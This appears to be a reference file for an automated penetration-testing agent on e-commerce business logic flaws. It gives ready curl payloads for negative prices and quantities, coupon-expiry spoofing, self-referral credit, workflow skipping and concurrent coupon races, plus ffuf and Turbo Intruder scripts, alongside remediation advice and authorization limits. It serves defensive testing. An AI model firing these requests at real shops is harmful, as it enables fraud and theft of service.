| Attribute | Value |
|---|---|
| **OWASP Top 10 2021** | A04 — Insecure Design |
| **CWE** | CWE-840 — Business Logic Errors |
| **Severity** | Medium to Critical |
| **Category** | Application Logic / Design |

## Overview

Business logic flaws are vulnerabilities in the design and implementation of an application's functional workflow. Unlike technical vulnerabilities (XSS, SQLi), these flaws exploit legitimate application features in unintended ways — manipulating pricing, bypassing purchase flows, exploiting race conditions in transactions, or abusing business rules.

## Types of Business Logic Flaws

### Race Conditions (TOCTOU)
Concurrent requests exploit a time-of-check/time-of-use window in a transaction.

**Examples:**
- Adding the same coupon multiple times before validation
- Withdrawing from the same balance simultaneously
- Registering the same username/email via parallel requests
- Ticket booking — double-booking via concurrent checkout

### Price Manipulation
The client modifies pricing parameters that should be server-enforced.

**Examples:**
- Changing `price` or `amount` fields in POST/PUT requests
- Negative prices resulting in account credit
- Currency conversion rounding with fractional pennies
- Modifying `discountPercent` or `shippingCost` fields

### Workflow Bypass
Skipping steps in a multi-stage process to bypass security or payment.

**Examples:**
- Skipping payment step and going directly to order confirmation
- Bypassing email/SMS verification during registration
- Skipping KYC/identity verification steps
- Direct access to `/order/confirm` without going through `/cart/checkout`

### Coupon / Discount Abuse
Exploiting the discount system beyond intended usage.

**Examples:**
- Applying the same coupon code multiple times
- Stacking non-stackable coupons
- Using expired coupon codes
- Creating referral loops (self-referral)

### Referral abuse (self-referral / referral credit)

The referral/registration flow may grant credit for a `referrer`/`referral`
field and trust it. This is a business-logic credit-achieving vector (unchecked
self-referral = free credit), NOT social engineering. Probe it on the
registration endpoint. When canonizing a confirmed referral grant, the
canonical `FIND-NNN.md` MUST quote the raw JSON field that proves the grant
— e.g. `"account_credit": 10.0` or `"credit": 10` (a non-zero value), exactly
as the server returned it — and the concrete field that changed
(`referral_count`). Capture the full credit-bearing response body (e.g. the
referrer's balance after the referral), not just the `201` status line. A
finding that says only `balance grew` without the raw JSON field is
unverifiable even with decisive evidence.

```bash
# 1. Register a throwaway account and read its profile to find a
#    referral/referrer code, OR inspect the register request for a
#    referral/referrer field.
curl -si -X POST "https://target.com/api/v1/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Passw0rd!","email":"alice@example.com","referral":"ALICE1"}'

# 2. Self-referral: register a second account whose referrer is the first
#    account's code, then check the second account for granted credit.
curl -si -X POST "https://target.com/api/v1/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"Passw0rd!","email":"bob@example.com","referrer":"ALICE1"}'

# 3. Inspect the response body (token, credit, balance) for a credit/additional
#    field, and re-fetch both profiles to see if either side gained credit.
```

**Key checks:** (1) does the register request accept a `referrer`/`referral`
field another account's code grants credit? (2) self-referral (own code);
(3) repeated referral from one account; (4) referral code that is an email,
UUID, or numeric id; (5) after account A refers B, does A's credit grow?

**Listen for the "persistent miss" pattern:** if a run reaches no finding for
register-time credit abuse, it likely never tested the referral field at all —
always include a register-with-referral step even when no referral UI is
visible (inspect the live app JS bundle for a `referral`/`referrer` key and
submit it).

### Clock Manipulation

```bash
# Test if server validates coupon expiry against client-provided timestamps
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"EXPIRED2023","timestamp":1893456000}'  # Far-future timestamp

# Test if clock can be manipulated by modifying Date header
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Content-Type: application/json" \
  -H "Date: Fri, 01 Jan 2030 00:00:00 GMT" \
  -d '{"coupon":"EXPIRED2023"}'

# Check if coupon validation uses server time (secure) or trusts client time (vulnerable)
```

### Negative Order / Refund Abuse

```bash
# Negative quantity test
curl -X POST "https://target.com/api/orders" \
  -H "Content-Type: application/json" \
  -d '{"productId":1,"quantity":-1,"price":99.99}'
# If accepted with negative total → user receives credit

# Negative price override
curl -X POST "https://target.com/api/orders" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"productId":1,"quantity":1,"price":-100}],"total":-100}'
```

**Related:** negative quantities, amounts, counts; integer overflow/underflow (e.g. price total wrapping, balance underflow, counter past max). See §Detection for the full field list and PoC payloads.

## Detection

### Price Manipulation Testing

Intercept a request that includes pricing, modify the `price`, `total`, `amount`, `currency`, or `discount` fields:

```
POST /api/checkout HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "productId": 123,
  "quantity": 1,
  "price": 0.01,       ← Modified from $49.99
  "currency": "USD",
  "total": 0.01         ← Modified from $49.99
}
```

**Other variations:**
- Send `"price": -100` for account credit
- Send `"price": 0` for free checkout
- Set currency to a weaker one without adjusting the price
- Change `"discount": 100` (expecting percentage)

### Race Condition Testing

Send multiple concurrent requests to the same state-changing endpoint:

```bash
# Using parallel curl — fire off simultaneous coupon applications
for i in {1..10}; do
  curl -s -X POST "https://shop.example.com/api/coupon/apply" \
    -H "Cookie: session=..." \
    -d "coupon=SAVE50&orderId=123" &
done
wait
```

### Workflow Bypass Testing

1. Map the intended workflow (e.g., Cart → Shipping → Payment → Confirmation)
2. Attempt to skip directly to the final step:
   - Try `GET /order/confirm?orderId=...` without completing payment
   - Try `POST /api/register/complete` without email verification
   - Try accessing authenticated features without completing onboarding
3. Check if server validates that each prior step was completed

### Negative Value / Boundary Testing

```bash
curl -X POST "https://shop.example.com/api/cart/add" \
  -H "Content-Type: application/json" \
  -d '{"productId": 42, "quantity": -1}'

curl -X POST "https://shop.example.com/api/cart/add" \
  -H "Content-Type: application/json" \
  -d '{"productId": 42, "quantity": 9999999999}'
```

**Other fields to test:**
- `amount`, `price`, `total`, `shippingCost`, `taxAmount`
- `page`, `offset`, `limit` (pagination overflow)
- `count`, `maxUsers`, `seats` (resource allocation)
- `rating`, `score`, `priority` (rating/manipulation)

## Tools

### ffuf — Parameter Fuzzing
Fuzz numeric parameters for business logic issues:
```bash
ffuf -w /usr/share/wordlists/params.txt \
  -X POST \
  -d '{"FUZZ":0.01,"productId":1}' \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -u https://target.com/api/checkout \
  -fw 0
```

### Turbo Intruder — Race Conditions
A Python Turbo Intruder script for race condition testing:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=10,
                           pipeline=True)

    for i in range(20):
        engine.queue(target.req, [])
        engine.queue(target.req, [])
        engine.queue(target.req, [])

def handleResponse(req, interesting):
    table.add(req)
```
Save the above to a file and load it in Burp Suite's Turbo Intruder extension.

### Python — Concurrent Requests (code_execution)
Use `delegate_task(tasks=[...])` to dispatch concurrent request agents. Each agent operates independently on a separate race window (same timestamp, varied payloads), returning structured results that you analyze for race-condition candidates.

> Manual `curl` PoC payloads (price/negative/qty, workflow-skip) are in §Detection and §Safe Proof of Concept — reuse those rather than duplicating.

## Safe Proof of Concept

**Do NOT complete a transaction** — demonstrate the flaw exists without making a real purchase or causing a permanent state change.

### Price Manipulation PoC (Safest)
```bash
# Show that price can be changed in the request
# Capture the cart preview — do NOT submit checkout
curl -v "https://target.com/api/cart/preview" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=..." \
  -d '{"items":[{"id":1,"price":0.01,"quantity":1}]}'
```
**Expected evidence:** Show that `total` in the response reflects the modified price.

### Race Condition PoC (Safe)
```bash
# Apply a single-use coupon twice — if both succeed before validation,
# show both applied without completing the order
for i in {1..2}; do
  curl -s "https://target.com/api/coupon/apply" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Cookie: session=..." \
    -d '{"coupon":"WELCOME10","orderId":101}' &
done
wait
```
**Expected evidence:** Response shows coupon applied twice or redis count incremented beyond expected.

### Workflow Bypass PoC (Safe)
```bash
# Attempt to access order confirmation without payment step
curl -v "https://target.com/checkout/confirm" \
  -X POST \
  -H "Cookie: session=..."
```
**Expected evidence:** Server returns confirmation page or order `status` shows confirmed without payment.

## Evidence Collection

Capture for each finding:

1. **Full HTTP request** — including headers, body, cookies
2. **Full HTTP response** — showing the logic flaw (e.g., price changed, coupon applied twice)
3. **For race conditions**: timestamps showing concurrent requests, logs showing double-application
4. **Before/after state** — demonstrate the state change was unintended

**Evidence template:**

```
--- Request ---
POST /api/checkout/preview HTTP/1.1
Host: shop.example.com
Content-Type: application/json
Cookie: session=abc123

{"items":[{"id":1,"price":0.01,"quantity":1}]}

--- Response ---
HTTP/1.1 200 OK
Content-Type: application/json

{"subtotal":0.01,"tax":0.00,"total":0.01,"originalTotal":49.99}
                                     ^^^^^^^^^^^^^^^^ Flaw demonstrated
```

## Remediation

### Server-Side Validation
- **Never trust client-supplied pricing** — always retrieve prices from the server-side database
- Validate all monetary calculations on the server using fixed-point math (BigDecimal, etc.)
- Reject negative values for quantity, amount, and count fields
- Validate that each workflow step was completed before allowing the next

### Transaction Integrity
- Use **database transactions** with proper locking (row-level locks, SELECT ... FOR UPDATE)
- Implement **idempotency keys** for critical operations (payment, coupon application)
- Use **atomic operations** (e.g., Redis `DECR` instead of read-then-write for inventory)
- Check balance/entitlement at the **moment of commitment**, not at the beginning

### Rate Limiting
- Implement **per-user** and **per-IP** rate limits on sensitive endpoints
- Apply **per-coupon** usage limits checked atomically
- Use **sliding window** rather than fixed window rate limiting for race conditions

### Idempotency Keys
Require a unique idempotency key for write operations:

```json
POST /api/checkout
{
  "idempotencyKey": "unique-request-id",
  "items": [...],
  "total": 49.99
}
```

Server returns 409 Conflict if the same key is reused — prevents double-processing in race conditions.

### Additional Defenses
- **Integrity checksums**: HMAC-signed request bodies so price/amount fields can't be tampered
- **Workflow state machine**: enforce state transitions on the server (Cart → Payment → Confirm)
- **Coupon stack limits**: enforce maximum number of coupons per order server-side
- **Audit logging**: log all state-changing operations with request details
- **Immediate rollback**: reverse state changes if a validation fails mid-transaction

## Stop Conditions
- Generic baseline — see `references/shared-safety.md` §Generic Stop Conditions (pause on unexpected behavior, scope breach, or WAF/IDS trip).

## Blocked / Out of Scope

The following actions are **prohibited** during testing:

| Activity | Reason |
|---|---|
| Completing fraudulent transactions (actually purchasing at $0.01) | Financial fraud / theft of service |
| Manipulating real production financial data | Data integrity violation |
| Causing permanent state changes without explicit authorization | System/data corruption |
| Coupon abuse that results in real inventory depletion | Inventory integrity |
| Race condition attacks on high-traffic production endpoints | Service degradation |
| Integer overflow that impacts real user balances | User data integrity |

> **Always obtain explicit authorization before executing any logic test that writes or modifies real data. Prefer sandbox/staging environments.**
